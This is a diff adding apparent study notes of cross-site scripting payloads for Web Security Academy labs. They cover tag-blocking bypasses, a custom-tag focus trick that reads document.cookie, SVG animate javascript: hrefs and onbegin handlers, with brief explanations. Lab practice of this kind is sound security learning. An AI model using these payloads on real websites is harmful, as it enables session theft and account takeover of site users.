@@ -1,0 +1,50 @@
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
+
+
+1- Most tags and attributes blocked:
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+=======================================================================================================================================================================
+
+2- all tags blocked except custom ones:
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
+
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+=======================================================================================================================================================================
+3- Event handlers and href attributes blocked
+
+
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+<svg>
+  <a>
+    <animate attributeName=href values=javascript:alert(1) />
+    <text x=20 y=20>Click me</text>
+  </a>
+
+
+The <animate> SVG element provides a way to animate an attribute of an element over time.
+If text is included in SVG not inside of a <text> element, it is not rendered. This is different than being hidden by default, as setting the display property won't show the text.
+
+<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
+  <rect width="10" height="10">
+    <animate
+      attributeName="rx"
+      values="0;5;0"
+      dur="10s"
+      repeatCount="indefinite" />
+  </rect>
+</svg>
+علامة الرابط (anchor tag) <a>
+href (Hypertext Reference) هو سمة (attribute)
+=======================================================================================================================================================================
+4- Some SVG markup allowed:
+
+<svg><animatetransform onbegin=alert(1)>
